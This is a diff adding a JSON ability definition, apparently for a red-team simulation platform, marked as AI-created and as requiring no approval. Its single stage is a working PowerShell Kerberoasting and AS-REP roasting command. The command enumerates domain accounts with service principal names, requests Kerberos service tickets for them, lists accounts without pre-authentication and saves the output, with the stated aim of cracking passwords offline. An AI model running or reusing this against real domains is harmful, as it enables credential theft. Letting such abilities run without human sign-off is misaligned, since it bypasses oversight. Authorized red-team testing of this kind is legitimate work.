@@ -1,0 +1,36 @@
+{
+  "ability_id": "ebfe3d57-1b83-4e3e-82c9-17502db1ee14",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-24T07:43:09.227667+00:00",
+  "ability": {
+    "name": "Kerberoasting and AS-REP Roasting",
+    "description": "Requests Kerberos tickets for accounts with SPNs and checks for users with DONT_REQ_PREAUTH.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1558.003",
+    "platform": "windows",
+    "impact_type": "read",
+    "default_severity": "medium",
+    "requires_approval": false,
+    "tags": [
+      "kerberoast",
+      "as-rep-roasting"
+    ],
+    "created_by": "ai",
+    "engagement_id": "2b46bea0854443f1a134f53563af2133"
+  },
+  "stages": [
+    {
+      "stage_name": "Perform Kerberoasting and AS-REP Roasting",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $hashes = @(); $searcher = [adsisearcher]'(samAccountType=805306368)'; $searcher.PageSize = 1000; $users = $searcher.FindAll(); foreach ($u in $users) { if ($u.Properties.serviceprincipalname) { $sam = $u.Properties.samaccountname[0]; foreach ($spn in $u.Properties.serviceprincipalname) { try { Add-Type -AssemblyName System.IdentityModel; $req = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $hashes += \\\"KERBEROASTED: SPN=$spn User=$sam\\\" } catch { $hashes += \\\"FAILED: SPN=$spn User=$sam Error=$($_.Exception.Message)\\\" } } } }; $asrepSearcher = [adsisearcher]'(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'; foreach ($u in $asrepSearcher.FindAll()) { $hashes += \\\"AS-REP ROASTABLE: User=$($u.Properties.samaccountname[0])\\\" }; $hashes -join [char]13+[char]10 } catch { \\\"ERROR: $_\\\" }) | Tee-Object -FilePath $d\\\\tickets.txt",
+      "timeout_seconds": 120,
+      "payload_id": null
+    }
+  ],
+  "rationale": "Identifies service accounts and roastable accounts within the domain to offline-crack passwords.",
+  "provider": "Lead Red Team Operator",
+  "cited_urls": [
+    "https://attack.mitre.org/techniques/T1558/003/"
+  ]
+}
